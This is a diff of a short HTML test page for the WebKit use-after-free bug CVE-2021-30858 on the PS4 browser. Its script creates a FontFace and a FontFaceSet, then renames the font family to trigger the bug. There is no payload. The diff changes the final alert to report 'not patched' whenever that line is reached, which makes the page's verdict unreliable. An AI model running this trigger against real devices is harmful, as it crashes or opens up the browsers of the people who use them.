@@ -1,26 +1,24 @@
 <html>
-    <title>Webkit 8.xx test</title>
+    <title>CVE-2021-30858 Webkit Test</title>
     <script>
 
         async function testwebkit() {
 
-            alert("THIS SITE IS A TEST FOR WEBKIT EXPLOIT FOR THE PS4\n CLICK OK\n IF YOU DON'T SEE ANY 'EXPLOIT PATCHED' ALERT OR 'MEMORY ERROR' ALERT OR ANY ERROR ALERT THAT'S MEAN IT'S NOT PATCH");
-            let font = new FontFace("font1", '', {});
-
+            alert("Testing CVE-2021-30858 on PS4 Browser.. Press OK to check if bug is not patched!!!");
+            let font = new FontFace('font1', 'url()',{});
+            alert("Step one. OK!!");
             var fontFaceSet = new FontFaceSet([font]);
+            alert("Step two. OK!!");
+            //UAF CODE...
+            font.family = 'font2';
+            alert("CVE-2021-30858 Webkit exploit bug.. Seems not patched!!");
 
-            font.family = "font2";
-            //do something after the font is loaded
-
-            alert("webkit exploit patched !");
-            
         }
 
     </script>
 
     <body>
-        <button onclick="testwebkit()">test exploit</button>
-
+        <button onclick="testwebkit()">Test CVE Bug</button>
     </body>
 
 </html>
